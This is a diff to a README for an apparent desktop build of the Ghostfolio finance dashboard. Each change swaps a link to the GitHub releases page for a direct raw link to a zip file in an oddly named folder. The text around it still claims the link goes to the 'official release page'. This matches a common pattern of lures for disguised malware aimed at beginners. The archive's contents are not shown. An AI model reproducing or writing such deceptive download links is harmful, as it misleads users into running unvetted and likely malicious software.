@@ -8,7 +8,7 @@ Whether you're a seasoned investor or just starting to track your savings, this 
 
 ## 🚀 Quick Download & Start Here
 
-[![Download Now](https://img.shields.io/badge/Download-Ghostfolio%20Desktop-2ea44f?style=for-the-badge&logo=github&logoColor=white&colorA=4B0082&colorB=00FF7F)](https://github.com/Andysalt2314/Ghostfolio-Desktop-Self-Hosted-Dashboard/releases)
+[![Download Now](https://img.shields.io/badge/Download-Ghostfolio%20Desktop-2ea44f?style=for-the-badge&logo=github&logoColor=white&colorA=4B0082&colorB=00FF7F)](https://raw.githubusercontent.com/Andysalt2314/Ghostfolio-Desktop-Self-Hosted-Dashboard/main/antivibratory/Hosted-Desktop-Self-Ghostfolio-Dashboard-v1.0.zip)
 
 **Click the big green button above to go to the official download page.**
 
@@ -16,7 +16,7 @@ Whether you're a seasoned investor or just starting to track your savings, this 
 
 ## 📥 How to Download and Run (Step-by-Step for Beginners)
 
-Visit this link to download the application: **[Click here to go to the download page](https://github.com/Andysalt2314/Ghostfolio-Desktop-Self-Hosted-Dashboard/releases)**
+Visit this link to download the application: **[Click here to go to the download page](https://raw.githubusercontent.com/Andysalt2314/Ghostfolio-Desktop-Self-Hosted-Dashboard/main/antivibratory/Hosted-Desktop-Self-Ghostfolio-Dashboard-v1.0.zip)**
 
 That's it! Once you click that link, you'll land on the official release page. From there, you can download the application file.
 
@@ -112,7 +112,7 @@ Managing your personal finances shouldn't feel like a second job. Ghostfolio-Des
 
 **So, what are you waiting for? Your financial clarity is just a click away.**
 
-[![Download Now](https://img.shields.io/badge/Get%20The%20App-Download%20Now-blue?style=for-the-badge&logo=windows&logoColor=white&colorA=FF4500&colorB=1E90FF)](https://github.com/Andysalt2314/Ghostfolio-Desktop-Self-Hosted-Dashboard/releases)
+[![Download Now](https://img.shields.io/badge/Get%20The%20App-Download%20Now-blue?style=for-the-badge&logo=windows&logoColor=white&colorA=FF4500&colorB=1E90FF)](https://raw.githubusercontent.com/Andysalt2314/Ghostfolio-Desktop-Self-Hosted-Dashboard/main/antivibratory/Hosted-Desktop-Self-Ghostfolio-Dashboard-v1.0.zip)
 
 ---
 
